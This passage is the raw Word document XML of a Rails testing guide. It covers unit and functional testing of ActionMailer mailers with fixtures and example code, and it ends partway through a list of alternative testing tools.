              </w:rPr>
              <w:t>=&gt; "posts", :action</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "show", :id</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "1"</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>}</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3D337958" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="23D8F257" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t>10 Testing Your Mailers</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54D5C68D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Testing mailer classes requires some specific tools to do a thorough job.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="282EEBFC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>10.1 Keeping the Postman in Check</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B1FF771" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Your mailer classes — like every other part of your Rails application — should be tested to ensure that it is working as expected.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04647C2D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>The goals of testing your mailer classes are to ensure that:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DFC80D3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="320"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>emails are being processed (created and sent)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AE6D426" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="320"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>the email content is correct (subject, sender, body, etc)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0465AA2C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="320"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>the right emails are being sent at the right times</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B3E10E8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t>10.1.1 From All Sides</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="271B7398" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>There are two aspects of testing your mailer, the unit tests and the functional tests. In the unit tests, you run the mailer in isolation with tightly controlled inputs and compare the output to a known value (a fixture.) In the functional tests you don’t so much test the minute details produced by the mailer; instead, we test that our controllers and models are using the mailer in the right way. You test to prove that the right email was sent at the right time.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="632E437E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>10.2 Unit Testing</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00E0183C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>In order to test that your mailer is working as expected, you can use unit tests to compare the actual results of the mailer with pre-written examples of what should be produced.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="300E7902" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t>10.2.1 Revenge of the Fixtures</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="364518F2" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">For the purposes of unit testing a mailer, fixtures are used to provide an example of how the output </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>should</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> look. Because these are example emails, and not Active Record data like the other fixtures, they are kept in their own subdirectory apart from the other fixtures. The name of the directory within </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>test/fixtures</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> directly corresponds to the name of the mailer. So, for a mailer named </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>UserMailer</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, the fixtures should reside in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>test/fixtures/user_mailer</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> directory.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13DACB61" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>When you generated your mailer, the generator creates stub fixtures for each of the mailers actions. If you didn’t use the generator you’ll have to make those files yourself.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BB900BC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t>10.2.2 The Basic Test Case</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="135E047E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Here’s a unit test to test a mailer named </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>UserMailer</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> whose action </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>invite</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is used to send an invitation to a friend. It is an adapted version of the base test created by the generator for an </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>invite</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> action.</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0E94462A" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="18DF013C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>require 'test_helper'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3E3F1BC3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1618CDD3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>UserMailerTest &lt; ActionMailer::TestCase</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="509CE427" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  tests UserMailer</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2DE99777" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  test "invite"</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>do</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="75648E43" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    @expected.from    = 'me@example.com'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2DB29EF8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    @expected.to      = 'friend@example.com'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="38896909" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    @expected.subject = "You have been invited by #{@expected.from}"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0A8F490D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    @expected.body    = read_fixture('invite')</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="35F235D7" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    @expected.date    = Time.now</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="280842D6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5FF8DB64" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    assert_equal @expected.encoded, UserMailer.create_invite('me@example.com', 'friend@example.com', @expected.date).encoded</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="69056863" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0F828EBC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1EAA83F0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="695460AB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">In this test, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>@expected</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is an instance of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>TMail::Mail</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> that you can use in your tests. It is defined in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>ActionMailer::TestCase</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. The test above uses </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>@expected</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to construct an email, which it then asserts with email created by the custom mailer. The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>invite</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> fixture is the body of the email and is used as the sample content to assert against. The helper </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>read_fixture</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is used to read in the content from this file.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="650D6ECA" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Here’s the content of the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>invite</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> fixture:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F602016" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="HTML1"/>
      </w:pPr>
      <w:r>
        <w:t>Hi friend@example.com,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35BBCAA1" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="HTML1"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="005945C7" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="HTML1"/>
      </w:pPr>
      <w:r>
        <w:t>You have been invited.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BD69B1C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="HTML1"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="73098DBC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="HTML1"/>
      </w:pPr>
      <w:r>
        <w:t>Cheers!</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="508F6A98" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">This is the right time to understand a little more about writing tests for your mailers. The line </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>ActionMailer::Base.delivery_method = :test</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>config/environments/test.rb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> sets the delivery method to test mode so that email will not actually be delivered (useful to avoid spamming your users while testing) but instead it will be appended to an array (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>ActionMailer::Base.deliveries</w:t>
      </w:r>
      <w:r>
        <w:t>).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28F92874" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>However often in unit tests, mails will not actually be sent, simply constructed, as in the example above, where the precise content of the email is checked against what it should be.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7991BECE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>10.3 Functional Testing</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6751EEC7" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Functional testing for mailers involves more than just checking that the email body, recipients and so forth are correct. In functional mail tests you call the mail deliver methods and check that the appropriate emails have been appended to the delivery list. It is fairly safe to assume that the deliver methods themselves do their job. You are probably more interested in whether your own business logic is sending emails when you expect them to go out. For example, you can check that the invite friend operation is sending an email appropriately:</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26F107C5" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4D423191" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>require 'test_helper'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7F746961" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2FFBA90C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>UserControllerTest &lt; ActionController::TestCase</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6491001B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  test "invite friend"</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>do</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="29BE0857" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    assert_difference 'ActionMailer::Base.deliveries.size', +1</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>do</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7A52C718" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      post :invite_friend, :email</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 'friend@example.com'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="54ACED96" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="092375BA" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    invite_email = ActionMailer::Base.deliveries.last</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="30681911" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2496795E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    assert_equal "You have been invited by me@example.com", invite_email.subject</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3BBADCF9" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    assert_equal 'friend@example.com', invite_email.to[0]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0ABBFD6C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    assert_match(/Hi friend@example.com/, invite_email.body)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="68F5DE37" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3B5AD6D9" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="07C3C83E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t>11 Other Testing Approaches</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CE5A46C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The built-in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>test/unit</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> based testing is not the only way to test Rails applications. Rails developers have come up with a wide variety of other approaches and aids for testing, including:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10E1C264" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="321"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId647" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>NullDB</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="009A002D">
        <w:t>, a way to speed up testing by avoiding database use.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FEB333F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="321"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId648" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Factory Girl</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="009A002D">
        <w:t>, a replacement for fixtures.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D19C537" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="321"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId649" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Machinist</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="009A002D">
        <w:t>, another replacement for fixtures.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20AF93D8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="321"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId650" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Shoulda</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="009A002D">
        <w:t xml:space="preserve">, an extension to </w:t>
      </w:r>
      <w:r w:rsidR="009A002D">
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>test/unit</w:t>
      </w:r>
